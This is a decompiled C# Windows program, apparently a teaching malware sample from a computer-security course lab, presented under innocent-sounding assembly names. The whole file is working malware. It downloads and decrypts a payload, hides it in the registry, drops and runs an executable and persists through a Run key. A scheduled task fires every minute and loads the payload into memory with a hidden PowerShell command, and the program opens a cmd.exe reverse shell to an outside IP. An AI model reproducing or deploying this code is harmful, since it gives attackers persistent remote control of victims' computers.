using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Cache;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.Win32;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("ThereIsNothingToSee")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Showcase")]
[assembly: AssemblyProduct("Innocent")]
[assembly: AssemblyCopyright("Showcase")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("12b739f7-2355-491e-a3cd-a8485d39d6d6")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: TargetFramework(".NETFramework,Version=v4.0", FrameworkDisplayName = ".NET Framework 4")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace Innocent;

internal class TakeThis
{
	private static StreamWriter streamWriter;

	private static void Main()
	{
		byte[] array = DownloadPayload(Encoding.Unicode.GetString(Convert.FromBase64String("aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBvAHUAcwBwAGcALwBDAG8AbQBwAFMAZQBjAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAEwAYQBiADMAXwBCAG8AdABuAGUAdABzAF8AYQBuAGQAXwBtAGEAbAB3AGEAcgBlAC8AbQBpAHMAYwAvAG0AYQBsAHcAYQByAGUALwBiAG8AbwBtAC4AZQBuAGMAcgB5AHAAdABlAGQA")));
		byte[] iV = StringToByteArray("222503488E34D554B0FEC555FA4A9569");
		byte[] key = StringToByteArray("B672EA3A555CB91998DE696C2304E4DF464765396E7D9D4CF6BA65ECB7E1324C");
		byte[] array2 = new byte[array.Length];
		Buffer.BlockCopy(array, 0, array2, 0, array2.Length);
		SHA256 val = SHA256.Create();
		try
		{
			InstallRegistry(DecryptStringFromBytes_Aes(array2, key, iV));
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		RunPayload(GetPayloadFromRegistry(), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\evil.exe");
		AddToSchtasks();
		LaunchCommandLineApp();
	}

	public static byte[] StringToByteArray(string hex)
	{
		int length = hex.Length;
		byte[] array = new byte[length / 2];
		for (int i = 0; i < length; i += 2)
		{
			array[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
		}
		return array;
	}

	private static byte[] GetPayloadFromRegistry()
	{
		using MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(Registry.CurrentUser.OpenSubKey("Software\\evil", true).GetValue("Payload").ToString()));
		return memoryStream.ToArray();
	}

	private static bool InstallPayload(string dropPath)
	{
		if (!Process.GetCurrentProcess().get_MainModule().get_FileName()
			.Equals(dropPath, StringComparison.CurrentCultureIgnoreCase))
		{
			FileStream fileStream = null;
			try
			{
				fileStream = (File.Exists(dropPath) ? new FileStream(dropPath, FileMode.Create) : new FileStream(dropPath, FileMode.CreateNew));
				byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().get_MainModule().get_FileName());
				fileStream.Write(array, 0, array.Length);
				fileStream.Dispose();
				Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(dropPath), (object)dropPath);
				Process.Start(dropPath);
				return true;
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	private static void RunPayload(byte[] payload, string dropPath)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			FileStream fileStream = null;
			try
			{
				fileStream = (File.Exists(dropPath) ? new FileStream(dropPath, FileMode.Create) : new FileStream(dropPath, FileMode.CreateNew));
				fileStream.Write(payload, 0, payload.Length);
				fileStream.Dispose();
				Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(dropPath), (object)dropPath);
				Process.Start(dropPath);
			}
			catch
			{
			}
		});
		thread.IsBackground = false;
		thread.Start();
	}

	private static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		if (cipherText == null || cipherText.Length == 0)
		{
			throw new ArgumentNullException("cipherText");
		}
		if (Key == null || Key.Length == 0)
		{
			throw new ArgumentNullException("Key");
		}
		if (IV == null || IV.Length == 0)
		{
			throw new ArgumentNullException("IV");
		}
		string text = null;
		AesCryptoServiceProvider val = new AesCryptoServiceProvider();
		try
		{
			((SymmetricAlgorithm)val).set_Key(Key);
			((SymmetricAlgorithm)val).set_IV(IV);
			((SymmetricAlgorithm)val).set_Mode((CipherMode)1);
			((SymmetricAlgorithm)val).set_Padding((PaddingMode)2);
			ICryptoTransform val2 = ((SymmetricAlgorithm)val).CreateDecryptor(((SymmetricAlgorithm)val).get_Key(), ((SymmetricAlgorithm)val).get_IV());
			using MemoryStream memoryStream = new MemoryStream(cipherText);
			CryptoStream val3 = new CryptoStream((Stream)memoryStream, val2, (CryptoStreamMode)0);
			try
			{
				using StreamReader streamReader = new StreamReader((Stream)(object)val3);
				return streamReader.ReadToEnd();
			}
			finally
			{
				((IDisposable)val3)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static byte[] DownloadPayload(string url)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		WebClient val = new WebClient();
		try
		{
			ServicePointManager.set_Expect100Continue(true);
			ServicePointManager.set_SecurityProtocol((SecurityProtocolType)(ServicePointManager.get_SecurityProtocol() | 0xFC0));
			val.set_CachePolicy(new RequestCachePolicy((RequestCacheLevel)1));
			((NameValueCollection)val.get_Headers()).Add("Cache-Control", "no-cache");
			val.set_Encoding(Encoding.UTF8);
			return new MemoryStream(val.DownloadData(url)).ToArray();
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static void InstallRegistry(string Payload)
	{
		RegistryKey val = Registry.CurrentUser.OpenSubKey("Software\\evil", true);
		if (val == null)
		{
			val = Registry.CurrentUser.CreateSubKey("Software\\evil");
			val.SetValue("Payload", (object)Payload);
		}
		else if (val.GetValue("Payload") == null || !val.GetValue("Payload").ToString()!.Equals(Payload, StringComparison.CurrentCultureIgnoreCase))
		{
			val.SetValue("Payload", (object)Payload);
		}
	}

	private static void LaunchCommandLineApp()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		ProcessStartInfo val = new ProcessStartInfo();
		val.set_CreateNoWindow(false);
		val.set_UseShellExecute(false);
		val.set_FileName("explorer");
		val.set_WindowStyle((ProcessWindowStyle)1);
		val.set_Arguments("\"https://i.redd.it/2ialma4xoiv41.jpg\"");
		try
		{
			Process val2 = Process.Start(val);
			try
			{
				val2.WaitForExit();
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch
		{
		}
		TcpClient val3 = new TcpClient("6.6.6.6", 443);
		try
		{
			using Stream stream = val3.GetStream();
			using StreamReader streamReader = new StreamReader(stream);
			streamWriter = new StreamWriter(stream);
			StringBuilder stringBuilder = new StringBuilder();
			Process val4 = new Process();
			val4.get_StartInfo().set_FileName("cmd.exe");
			val4.get_StartInfo().set_CreateNoWindow(true);
			val4.get_StartInfo().set_UseShellExecute(false);
			val4.get_StartInfo().set_RedirectStandardOutput(true);
			val4.get_StartInfo().set_RedirectStandardInput(true);
			val4.get_StartInfo().set_RedirectStandardError(true);
			val4.add_OutputDataReceived(new DataReceivedEventHandler(CmdOutputDataHandler));
			val4.Start();
			val4.BeginOutputReadLine();
			while (true)
			{
				stringBuilder.Append(streamReader.ReadLine());
				val4.get_StandardInput().WriteLine((object?)stringBuilder);
				stringBuilder.Remove(0, stringBuilder.Length);
			}
		}
		finally
		{
			((IDisposable)val3)?.Dispose();
		}
	}

	private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
	{
		StringBuilder stringBuilder = new StringBuilder();
		if (!string.IsNullOrEmpty(outLine.get_Data()))
		{
			try
			{
				stringBuilder.Append(outLine.get_Data());
				streamWriter.WriteLine((object?)stringBuilder);
				streamWriter.Flush();
			}
			catch (Exception)
			{
			}
		}
	}

	private static void AddToSchtasks()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0046: Expected O, but got Unknown
		string text = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\\Software\\evil\\).Payload)).EntryPoint.Invoke($Null,$Null)";
		ProcessStartInfo val = new ProcessStartInfo();
		val.set_FileName("schtasks");
		val.set_Arguments("/create /sc minute /mo 1 /tn LimeLoader /tr \"" + text + "\"");
		val.set_CreateNoWindow(true);
		val.set_ErrorDialog(false);
		val.set_WindowStyle((ProcessWindowStyle)1);
		Process.Start(val);
	}
}
